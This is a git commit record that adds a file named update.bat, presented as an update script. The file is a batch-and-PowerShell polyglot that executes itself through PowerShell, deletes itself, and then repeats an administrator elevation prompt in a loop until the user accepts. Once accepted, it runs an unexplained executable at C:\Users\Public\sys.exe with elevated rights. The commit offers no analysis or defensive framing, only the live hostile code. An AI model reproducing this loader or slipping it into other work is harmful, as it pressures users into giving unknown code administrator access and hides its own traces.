067f76a78a39bca42a414d11c7fc0292a3eea31b
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-03-09 19:33:04 +0000

    Add files via upload

---
+++ update.bat
@@ -0,0 +1,10 @@
+<# :
+@echo off
+setlocal
+cd "%~dp0"
+powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
+del "%~f0"
+endlocal
+goto:eof
+#>
+while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k C:\Users\Public\sys.exe ';exit}catch{}}
